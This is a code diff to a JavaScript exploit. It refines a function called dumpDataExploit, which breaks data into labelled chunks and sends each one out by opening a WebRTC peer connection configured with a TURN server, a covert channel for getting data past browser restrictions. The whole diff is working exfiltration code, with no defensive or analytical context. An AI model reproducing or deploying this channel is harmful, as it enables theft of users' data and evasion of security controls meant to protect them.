@@ -47,11 +47,9 @@ async function addScriptToDocument(src) {
 async function getAnswerFromOffer(sdp) {
   // Create connection
   const connection = new RTCPeerConnection();
-  // On candidate
-  connection.onicecandidate = (event) => {
-    if (event.candidate) {
-      console.log("candidate", event.candidate);
-    }
+  // Set data channel
+  connection.ondatachannel = (event) => {
+    console.log("ondatachannel", event);
   };
   // Set remote description
   await connection.setRemoteDescription({
@@ -67,20 +65,30 @@ async function getAnswerFromOffer(sdp) {
 /**
  * Send a data through to the TURN server
  * @param {string} data
+ * @param {number} sdpIndex
  * @param {number} chunkSize
  */
 const dumpDataExploit = async (data, sdpIndex, chunkSize = 128) => {
+  // Unique identifier for this dump
   const identifier = Math.random().toString(36).substring(7);
-  const sdpIndexPadded = sdpIndex.toString().padStart(3, "0");
-  const dataChunkSize = chunkSize - identifier.length - 3 - 4;
-  let chunkNumber = 0;
-  for (let i = 0; i < data.length; i += dataChunkSize) {
-    const chunkNumberPadded = chunkNumber.toString().padStart(2, "0");
-    const chunk = `${identifier}:${sdpIndexPadded}:${chunkNumberPadded}:${data.substring(
-      i,
-      i + dataChunkSize
-    )}`;
-    console.log("chunk", chunk, chunk.length, connectionInfo);
+
+  // Which sdp index the client is replying to
+  const sdpIndexPadded = sdpIndex.toString().padStart(2, "0");
+
+  // Size of 1 chunk
+  const dataChunkSize = chunkSize - identifier.length - 9;
+
+  // Number of chunks total
+  const numberOfChunks = Math.ceil(data.length / dataChunkSize);
+  const numberOfChunksPadded = numberOfChunks.toString().padStart(2, "0");
+
+  for (let ind = 0; ind < numberOfChunks; ind++) {
+    const indPadded = ind.toString().padStart(2, "0");
+    const chunkData = data.substring(
+      ind * dataChunkSize,
+      (ind + 1) * dataChunkSize
+    );
+    const chunk = `${identifier}:${indPadded}:${numberOfChunksPadded}:${sdpIndexPadded}:${chunkData}`;
     new RTCPeerConnection({
       iceServers: [
         {
@@ -93,7 +101,6 @@ const dumpDataExploit = async (data, sdpIndex, chunkSize = 128) => {
       ],
       iceCandidatePoolSize: 1,
     });
-    chunkNumber++;
   }
 };
 
